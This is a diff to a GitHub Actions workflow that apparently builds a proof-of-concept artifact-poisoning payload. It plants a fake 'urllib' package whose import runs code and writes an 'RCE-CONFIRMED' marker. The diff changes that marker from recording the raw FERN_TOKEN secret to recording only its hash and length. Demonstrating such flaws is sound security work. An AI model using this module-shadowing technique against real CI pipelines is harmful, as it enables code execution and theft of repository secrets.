@@ -19,10 +19,11 @@ jobs:
           echo "some-branch" > payload/preview-metadata/head_ref
           printf 'docs/a.md\n' > payload/preview-metadata/changed_md_files
           cat > payload/urllib/__init__.py <<'PY'
-          import os, glob
+          import os, hashlib
           marker = os.path.join(os.getcwd(), "pwned.txt")
+          tok = os.environ.get("FERN_TOKEN", "")
           with open(marker, "w") as f:
-              f.write("RCE-CONFIRMED cwd=%s FERN_TOKEN=%s\n" % (os.getcwd(), os.environ.get("FERN_TOKEN")))
+              f.write("RCE-CONFIRMED cwd=%s token_sha256=%s token_len=%d\n" % (os.getcwd(), hashlib.sha256(tok.encode()).hexdigest(), len(tok)))
           PY
           echo 'def quote(s, safe=None): return s' > payload/urllib/parse.py
       - name: Upload fern sources and metadata
